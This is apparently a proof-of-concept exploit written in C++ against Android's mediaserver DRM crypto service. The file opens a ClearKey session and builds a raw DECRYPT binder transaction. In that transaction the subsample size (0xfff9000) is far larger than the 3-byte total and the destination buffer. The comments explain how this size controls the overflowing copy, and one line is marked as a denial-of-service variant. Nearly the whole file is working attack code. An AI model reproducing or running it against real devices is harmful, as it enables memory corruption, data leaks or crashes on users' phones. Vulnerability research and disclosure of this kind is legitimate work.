#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <utils/Log.h>

#include <binder/IPCThreadState.h>
#include <binder/ProcessState.h>
#include <binder/IServiceManager.h>

#include <gui/ISurfaceComposer.h>
#include <gui/BufferQueue.h>
#include <gui/CpuConsumer.h>
#include <unistd.h>
extern "C"{
#include <NdkMediaCrypto.h>
#include <NdkMediaDrm.h>
}
#include <media/ICrypto.h>
#include "AString.h"
#include "MediaErrors.h"


using namespace android;


static const uint8_t kClearKeyUUID[16] = {
    0x10,0x77,0xEF,0xEC,0xC0,0xB2,0x4D,0x02,
    0xAC,0xE3,0x3C,0x1E,0x52,0xE2,0xFB,0x4B
};
struct AMediaCrypto {
    sp<ICrypto> mCrypto;
};
sp<ICrypto> getICrypto(){

    bool isSupport=AMediaDrm_isCryptoSchemeSupported(kClearKeyUUID,NULL);
    if(!isSupport){
        printf("don't support clearkey\n");
        return NULL;
    }
    AMediaDrm* mediaDrm = AMediaDrm_createByUUID(kClearKeyUUID);
    AMediaDrmSessionId sessionId;
    memset(&sessionId,0,sizeof(sessionId));
    media_status_t status = AMediaDrm_openSession(mediaDrm,&sessionId);
    if(status != AMEDIA_OK){
        printf("open session failed\n");
        return NULL;
    }
    printf("id %s len is %d\n",sessionId.ptr,sessionId.length);
    AMediaCrypto* mediaCrypto = AMediaCrypto_new(kClearKeyUUID, sessionId.ptr, sessionId.length);
    //AMediaCrypto* mediaCrypto = AMediaCrypto_new(kClearKeyUUID, "aa", 2);//DoS
    if(mediaCrypto==NULL){
        printf("create media crypto failed\n");
        return NULL;
    }
    return mediaCrypto->mCrypto;

}
ssize_t decrypt(
        bool secure,
        const uint8_t key[16],
        const uint8_t iv[16],
        CryptoPlugin::Mode mode,
        const void *srcPtr,
        const size_t totalSize,
        const CryptoPlugin::SubSample *subSamples, size_t numSubSamples,
        void *dstPtr,
        AString *errorDetailMsg,
        sp <ICrypto> &crypto) {
    Parcel data, reply;
    data.writeInterfaceToken(crypto.get()->ICrypto::getInterfaceDescriptor());
    data.writeInt32(secure);
    data.writeInt32(mode);

    static const uint8_t kDummy[16] = { 0 };
    if (key == NULL) {
        key = kDummy;
    }
    if (iv == NULL) {
        iv = kDummy;
    }
    data.write(key, 16);
    data.write(iv, 16);

    /*size_t totalSize = 0;
    for (size_t i = 0; i < numSubSamples; ++i) {
        totalSize += subSamples[i].mNumBytesOfEncryptedData;
        totalSize += subSamples[i].mNumBytesOfClearData;
    }*/

    data.writeInt32(totalSize);
    data.write(srcPtr, totalSize);

    data.writeInt32(numSubSamples);
    data.write(subSamples, sizeof(CryptoPlugin::SubSample) * numSubSamples);

    if (secure) {
        data.writeInt64(static_cast<uint64_t>(reinterpret_cast<uintptr_t>(dstPtr)));
    }
    
    #define DECRYPT 6
    //crypto->asBinder()->transact(DECRYPT, data, &reply);
    IInterface::asBinder(crypto)->transact(DECRYPT, data, &reply);
    ssize_t result = reply.readInt32();
    if (result >= ERROR_DRM_VENDOR_MIN && result <= ERROR_DRM_VENDOR_MAX) {
        errorDetailMsg->setTo(reply.readCString());
    }
    if (!secure && result >= 0) {
        reply.read(dstPtr, result);
    }
    return result;
}

int main()
{

    sp<ICrypto> crypto = getICrypto();
    if(crypto==NULL)
        exit(-1);

    bool isSupport = crypto->isCryptoSchemeSupported(kClearKeyUUID);
    printf("isSupport equal %d\n",isSupport);
    CryptoPlugin::SubSample subSamples[2];
    subSamples[0].mNumBytesOfClearData=0xfff9000;//this value can controlled the size of data copied to destination buffer
    subSamples[0].mNumBytesOfEncryptedData=0;
    subSamples[1].mNumBytesOfClearData=0;
    subSamples[1].mNumBytesOfEncryptedData=9;//set this valule to no-zero to ensure media_server don't crash always.
    CryptoPlugin::Mode mode = (CryptoPlugin::Mode)0;//kMode_Unencrypted
    AString errMsg;
    char retBuffer[2000];
    decrypt(false,NULL,NULL,mode,"aaaaa",3,subSamples,2,retBuffer,&errMsg,crypto);//3 is the allocated size of destination buffer
    return 0;
}   
